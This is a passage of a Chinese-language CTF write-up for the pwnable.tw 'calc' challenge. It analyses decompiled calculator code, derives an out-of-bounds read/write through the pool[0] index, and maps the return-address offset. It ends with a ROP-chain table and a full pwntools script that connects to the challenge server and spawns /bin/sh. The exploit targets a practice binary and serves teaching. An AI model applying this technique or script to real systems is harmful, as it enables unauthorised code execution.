+<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">      point_on_input = i + <span class="number">1</span> + input;</span><br><span class="line">      <span class="keyword">if</span> ( operators_array[operators_array_index] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + input) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( operators_array[operators_array_index] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; operators_array[operators_array_index] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            operators_array[++operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            <span class="built_in">eval</span>(pool, operators_array[operators_array_index]);</span><br><span class="line">            operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">eval</span>(pool, operators_array[operators_array_index--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + input) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( operators_array_index &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">eval</span>(pool, operators_array[operators_array_index--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>如果符號陣列不是空就照不同情況作運算，否則放入目前符號到符號陣列中，呼叫 <code>eval()</code> 計算。</p>
+<h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">eval</span><span class="params">(_DWORD *pool, <span class="type">char</span> operators)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( operators == <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] += pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operators &gt; <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( operators == <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] -= pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( operators == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] /= (<span class="type">int</span>)pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operators == <span class="string">&#x27;*&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] *= pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  --*pool;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以發現 <code>eval()</code> 都是用 <code>pool[0]</code> 當成相對位址的 <code>base</code> 來取其他位置的值</p>
+<h2 id="0x3-Fuzzing-Analyze"><a href="#0x3-Fuzzing-Analyze" class="headerlink" title="0x3 Fuzzing &amp; Analyze"></a>0x3 Fuzzing &amp; Analyze</h2><p>在最一開始執行程式的時候有發現只要開頭是符號結果就怪怪的，我們來分析一下出了什麼問題，先拿 +12+34 當例子：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+12+34</span><br><span class="line">34</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>第一個加號</li>
+</ul>
+<ol>
+<li>因為是符號會通過最外層的 <code>if</code>，且 <code>part_input = &#39;&#39;</code>，不等於 0 所以不會輸出錯誤訊息。</li>
+<li>接著 <code>atoi</code> 會把空字串轉成 0，沒有大於 0 所以第一個判斷不會進，後面不是符號所以也不會進錯誤。</li>
+<li><code>operators_array[operators_array_index]</code> 是空的所以會執行<code>operators_array[0] = &#39;+&#39;</code>，後面還有東西所以繼續執行。</li>
+</ol>
+<ul>
+<li>第二個加號</li>
+</ul>
+<ol>
+<li>一樣會通過最外層的 <code>if</code>，<code>part_input = 12</code>，非 0 所以不會進錯誤。</li>
+<li>整數 56 大於 0，所以會執行以下的程式碼：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+也就是：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">pool[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">pool[<span class="number">1</span>] = part_input_int = <span class="number">12</span>;</span><br></pre></td></tr></table></figure></div>
+下個字元不是符號不會進錯誤。</li>
+<li>符號陣列已經存了一個 <code>&#39;+&#39;</code> 所以會執行：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(pool, operators_array[operators_array_index]);</span><br><span class="line">operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br></pre></td></tr></table></figure></div>
+也就是：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(pool, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="comment">// 進入 eval()</span></span><br><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br><span class="line"><span class="comment">// 離開 eval()</span></span><br><span class="line">operators_array[<span class="number">0</span>] = <span class="string">&#x27;+&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+我們再細看一下 <code>pool[pool[0] - 1] += pool[pool[0]];</code>：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">pool[<span class="number">1</span><span class="number">-1</span>] = pool[<span class="number">0</span>]</span><br><span class="line">pool[<span class="number">0</span>] += pool[<span class="number">1</span>] = <span class="number">12</span></span><br><span class="line">pool[<span class="number">0</span>] + <span class="number">1</span> - <span class="number">1</span> = <span class="number">12</span></span><br></pre></td></tr></table></figure></div>
+關鍵就在這裡，作為相對位址基值的第零格被我們篡改了！<br>接下就會再執行一次下面兩段程式碼：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line">pool_index = (*pool)++;</span><br><span class="line">pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div>
+也就是：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line">pool_index = pool[<span class="number">0</span>]++ = <span class="number">13</span>;</span><br><span class="line">pool[<span class="number">0</span>] = <span class="number">14</span></span><br><span class="line">pool[<span class="number">13</span> + <span class="number">1</span>] = <span class="number">34</span></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">pool[<span class="number">14</span> - <span class="number">1</span>] += pool[<span class="number">14</span>] = <span class="number">34</span></span><br><span class="line">pool[<span class="number">13</span>] = pool[<span class="number">13</span>] + <span class="number">34</span></span><br><span class="line">pool[<span class="number">0</span>] - <span class="number">1</span> = <span class="number">13</span></span><br></pre></td></tr></table></figure></div>
+這代表我們可以做到任意寫和任意讀，確認一下輸出的位置是哪裡：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">parse_expr</span>((<span class="type">int</span>)input, pool) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+所以會印出 <code>pool[pool[0]]</code>:<br>在這裡的情況就是<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] = <span class="number">13</span></span><br><span class="line">pool[pool[<span class="number">0</span>]] = pool[<span class="number">13</span>]</span><br></pre></td></tr></table></figure></div>
+所以會印出 pool[13] &#x3D; pool[13] + 34<br>我們來把結論代數化方便我們理解他們的關係：<br>$$<br>x, y \in \mathbb{Z}^+ \setminus {0}<br>$$</li>
+</ol>
+<h3 id="Case-1-x"><a href="#Case-1-x" class="headerlink" title="Case 1: +x"></a>Case 1: +x</h3><p>執行 1：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>結果 1：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">pool[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">pool[<span class="number">1</span>] = x</span><br></pre></td></tr></table></figure></div>
+<p>執行 2:</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div>
+<p>結果 2:</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] += pool[<span class="number">1</span>] = x </span><br><span class="line">pool[<span class="number">0</span>] = x + <span class="number">1</span> - <span class="number">1</span> = x</span><br></pre></td></tr></table></figure></div>
+<p>印出：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>]] = pool[x]</span><br></pre></td></tr></table></figure></div>
+<h3 id="Case-2-x-y"><a href="#Case-2-x-y" class="headerlink" title="Case 2: +x+y"></a>Case 2: +x+y</h3><p>基於上面的結果我們再加 y：<br>目前：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = <span class="number">0</span></span><br><span class="line">pool[<span class="number">0</span>] = x</span><br><span class="line">pool[<span class="number">1</span>] = x </span><br></pre></td></tr></table></figure></div>
+<p>執行 1：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>結果 1：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = x</span><br><span class="line">pool[<span class="number">0</span>] = x + <span class="number">1</span></span><br><span class="line">pool[x + <span class="number">1</span>] = y</span><br></pre></td></tr></table></figure></div>
+<p>執行 2:</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div>
+<p>結果 2:</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool[x + <span class="number">1</span> - <span class="number">1</span>] += pool[x + <span class="number">1</span>] = y</span><br><span class="line">pool[x] += y</span><br><span class="line">pool[x] = pool[x] + y</span><br><span class="line">pool[<span class="number">0</span>] = x</span><br></pre></td></tr></table></figure></div>
+<p>印出：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>]] = pool[x] = pool[x] + y</span><br></pre></td></tr></table></figure></div>
+<h3 id="代數化結論"><a href="#代數化結論" class="headerlink" title="代數化結論"></a>代數化結論</h3><ul>
+<li>+x<ul>
+<li>印出 pool[x]</li>
+</ul>
+</li>
+<li>+x+y<ul>
+<li>pool[x] &#x3D; pool[x] + y</li>
+<li>pool[x + 1] &#x3D; y</li>
+<li>印出 pool[x] &#x3D; pool[x] + y</li>
+</ul>
+</li>
+</ul>
+<p>我們執行一個特殊的 case 確認一下我們的推論：<br>因為迴圈每次都會執行 <code>init_pool(pool);</code><br>所以 case 會挑 pool 外的地址</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+400      <span class="comment"># print(pool[400])</span></span><br><span class="line">-1715908  <span class="comment"># pool[400]</span></span><br><span class="line">+399+123  <span class="comment"># pool[400] = 123 print(pool[399] + 123)</span></span><br><span class="line">123       <span class="comment"># pool[399] + 123</span></span><br><span class="line">+400      <span class="comment"># print(pool[400])</span></span><br><span class="line">123       <span class="comment"># pool[400]</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="結論正確！"><a href="#結論正確！" class="headerlink" title="結論正確！"></a>結論正確！</h3><h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><p>我們已經可以做到任意的 oob write &amp; read 了，再來就是找 ret 跟 pool 的相對位置：<br>在 ida 有很貼心的幫我們標示 <code>pool[]</code> 的位置：<br><code>int pool[101]; // [esp+18h] [ebp-5A0h] BYREF</code><br>又 <code>cal()</code> 的 ret 在 ebp + 0x4，<br>0x5A0 + 0x4 &#x3D; 0x5A4 &#x2F; 4 &#x3D; 361<br>所以 ret 在 <code>pool[361]</code> 的位置。<br>那最一開始有提到這題有開 NX 不能直接寫 shellcode，但因為是 statically linked，所以我會想先嘗試 rop 開 shell。<br>我們還需要知道 main_ebp 的位置，因為這題找不到 “\bin\sh”，所以我們要自己填再跳上去，因此會需要 leak main_ebp。<br>那 leak 的方式也很簡單，因為 pool[360] 就是存 main_ebp 所以可以透過輸入 +360 來獲得。<br>等等會直接把 <code>/bin/sh</code> 放在 <code>in 0x80</code> 後面，所以把 stack frame 用 gdb 釐清一下，進到 <code>calc()</code> 後印出 <code>$ebp</code>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x <span class="variable">$ebp</span></span><br><span class="line">0xffffd278:     0xffffd298</span><br></pre></td></tr></table></figure></div>
+<p>我們來用表格呈現一下我們的 ROP chain</p>
+<table>
+<thead>
+<tr>
+<th align="center">Stack</th>
+<th align="center">pool</th>
+<th align="center">value</th>
+<th align="center">Note</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">calc_ebp</td>
+<td align="center">pool[360]</td>
+<td align="center">main_ebp</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">calc_ret</td>
+<td align="center">pool[361]</td>
+<td align="center">0x0805c34b</td>
+<td align="center">pop_eax</td>
+</tr>
+<tr>
+<td align="center">main_ebp-0x18</td>
+<td align="center">pool[362]</td>
+<td align="center">0x0b</td>
+<td align="center">11</td>
+</tr>
+<tr>
+<td align="center">main_ebp-0x14</td>
+<td align="center">pool[363]</td>
+<td align="center">0x080701d0</td>
+<td align="center">pop_edx_ecx_ebx</td>
+</tr>
+<tr>
+<td align="center">main_ebp-0x10</td>
+<td align="center">pool[364]</td>
+<td align="center">0x0</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">main_ebp-0xc</td>
+<td align="center">pool[365]</td>
+<td align="center">0x0</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">main_ebp-0x8</td>
+<td align="center">pool[366]</td>
+<td align="center">main_ebp</td>
+<td align="center">bin_sh_addr</td>
+</tr>
+<tr>
+<td align="center">main_ebp-0x4</td>
+<td align="center">pool[367]</td>
+<td align="center">0x08049a21</td>
+<td align="center">int 0x80</td>
+</tr>
+<tr>
+<td align="center">main_ebp</td>
+<td align="center">pool[368]</td>
+<td align="center">u32(“&#x2F;bin”)</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">main_ret</td>
+<td align="center">pool[369]</td>
+<td align="center">u32(“&#x2F;sh\0”)</td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p>填的時候要注意不能單獨出現 0，所以我們可以利用 +x+y 會把 pool[x] &#x3D; pool[x] + y 的特性來放置我們的 rop，就可以避免跳 <code>prevent division by zero</code> 的錯誤。</p>
+<h2 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./calc&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10100</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;+360&quot;</span>)</span><br><span class="line">main_ebp = <span class="built_in">int</span>(r.recv())</span><br><span class="line">success(<span class="string">&quot;main_ebp: %s&quot;</span> % <span class="built_in">hex</span>(main_ebp))</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x080701d0</span></span><br><span class="line">int_0x80 = <span class="number">0x08049a21</span></span><br><span class="line"></span><br><span class="line">rop = [pop_eax, <span class="number">0x0b</span>, pop_edx_ecx_ebx, <span class="number">0x0</span>, <span class="number">0x0</span>, main_ebp, int_0x80, u32(<span class="string">&quot;/bin&quot;</span>), u32(<span class="string">&quot;/sh\0&quot;</span>)]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">361</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rop:</span><br><span class="line">    payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    temp = <span class="built_in">int</span>(r.recv())</span><br><span class="line">    temp = i - temp</span><br><span class="line">    <span class="keyword">if</span> temp &gt;= <span class="number">0</span>:</span><br><span class="line">        payload += <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(temp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += <span class="built_in">str</span>(temp)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv()</span><br><span class="line">    offset += <span class="number">1</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+<h2 id="0x6-References"><a href="#0x6-References" class="headerlink" title="0x6 References"></a>0x6 References</h2><p><a class="link"   target="_blank" rel="noopener" href="https://hackmd.io/@Zero871015/pwnable#calc" >https://hackmd.io/@Zero871015/pwnable#calc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/01/calc/" >https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/01/calc/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46521144/article/details/118543069" >https://blog.csdn.net/weixin_46521144/article/details/118543069 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h3>
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Pwnable.tw calc Writeup</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2024-02-11 22:59:16</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-02-14 22:40:07
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2024/02/11/Pwnable-tw-calc-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/rop/">#rop</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/oob/">#oob</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwnabletw/">#pwnabletw</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/02/11/Note-for-Pwn/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Notes for Pwn</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
